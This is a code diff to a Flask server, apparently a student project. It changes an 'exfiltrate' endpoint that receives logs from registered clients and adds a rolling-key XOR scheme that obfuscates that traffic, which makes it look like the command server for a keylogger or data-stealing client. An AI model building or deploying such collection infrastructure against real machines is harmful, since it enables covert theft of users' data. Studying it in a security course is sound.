@@ -63,10 +63,11 @@ def register():
 def exfiltrate(cid):
     if cid not in clients.keys():
         return 'UNKNOWN CLI', 400, PLAIN_TEXT
-    
-    # add the log to logs
-    data = request.get_data(as_text=True)
-    clients[cid].add_log(data)
+
+    log = request.get_data(as_text=False) # we want bytes not text!
+    log = decode(log)  # decode the encoded logs
+
+    clients[cid].add_log(log)
     return 'OK', 200, PLAIN_TEXT
 
 
@@ -123,5 +124,41 @@ def get_log(cid):
     return '\n'.join(clients[cid].logs), 200, PLAIN_TEXT
 
 
+
+# -------------------------
+# Encoding helper functions
+# -------------------------
+
+
+def rotate_right(ch):
+    ''' This performs the same operation as in my c code 
+    but applies an 8-bit mask of 0xFF. This knowledge was
+    sourced from chatgpt.com (OpenAI, 2025) 
+    '''
+    return ((ch >> 1) | (ch << (8 - 1))) & 0xFF
+
+def encode(msg: str) -> str:
+    ' Encode the message '
+    return asym_xor(msg.encode('utf-8'))
+
+def decode(msg: bytes) -> str:
+    ' Decodes and encoded message '
+    return asym_xor(msg).decode('utf-8')
+
+def asym_xor(s: bytes):
+    ' symetric encoding helper function '
+    key = 0x2E
+    result = bytearray()
+
+    for byte in s:
+        if byte != key and key != 0x00:
+            byte ^= key   # perform xor
+        result.append(byte)
+        key = rotate_right(key)
+
+    return bytes(result)
+
+
 if __name__ == '__main__':
-    app.run(host='127.0.0.1', threaded=True) # port=5000
+    app.run(host='127.0.0.1', threaded=True)
+
